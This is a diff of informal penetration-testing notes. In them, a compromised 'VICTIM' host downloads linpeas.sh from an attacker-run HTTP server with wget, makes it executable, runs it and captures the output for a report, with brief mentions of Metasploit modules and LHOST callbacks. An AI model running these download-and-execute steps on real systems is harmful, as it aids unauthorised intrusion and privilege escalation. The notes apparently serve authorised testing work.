@@ -21,7 +21,6 @@ use exploit modules as much as possible.
 LHOST comming back through our WAN
 
 
-
 [[[[[[SKIP!!! THIS. TO HARD STOP, RABBIT HOLE]]]]]]
 this will be for the report that enumeration was a dead end
 (ATK)(msf6) exploit(this is not the actual name of the module would need to go back) > show options
@@ -67,9 +66,17 @@ were going to download linPEAS to ourselves (ATTACKER) and then access it throug
 
 (VICTIM) wget http://192.168.122.209:8000/linpeas.sh
 (VICTIM) mv linpeas.sh /tmp
-(VICTIM)cd /tmp
-(VICTIM)ls
+(VICTIM) cd /tmp
+(VICTIM) ls
 (VICTIM) chmod u+x linpeas.sh
 (VICTIM) ls -al
 (VICTIM) ctl a + H (capture everything you run in TERM)
 (VICTIM) ./linpeas.sh 
+(VICTIM) watch ls -l
+
+(ATTACKER) ctl a + H (Close Capture)
+(ATTACKER) ls
+(ATTACKER) mv screenlog.3 linpeas_output
+(ATTACKER) mv linpeas_output ./Desktop/pentest/internal/192.168.1.102 [this might not be your file path so just make sure its in "internal"]
+(ATTACKER) cd [your path to verify]
+(ATTACKER) cat linpeas_output| less -r
